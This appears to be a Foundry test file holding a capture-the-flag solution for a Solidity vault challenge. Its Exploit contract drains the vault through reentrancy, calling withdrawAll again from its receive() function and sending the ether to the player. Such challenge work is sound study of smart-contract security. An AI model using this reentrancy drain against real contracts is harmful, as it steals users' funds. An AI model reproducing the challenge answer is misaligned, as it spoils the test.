// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 1 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "player balance",
            playerAddress.balance,
            18
        );
        emit log_named_decimal_uint(
            "vault balance",
            address(setup.vault()).balance,
            18
        );

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        Exploit exploit = new Exploit(setup);
        exploit.execute{value: 1 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint(
            "player balance",
            playerAddress.balance,
            18
        );
        emit log_named_decimal_uint(
            "vault balance",
            address(setup.vault()).balance,
            18
        );
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit {
    Setup setup;

    constructor(Setup setup_) {
        setup = setup_;
    }

    function execute() external payable {
        setup.vault().deposit{value: msg.value}();
        setup.vault().withdrawAll();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(setup.vault()).balance == 0) return;
        setup.vault().withdrawAll();
    }
}
////////// YOUR CODE END //////////
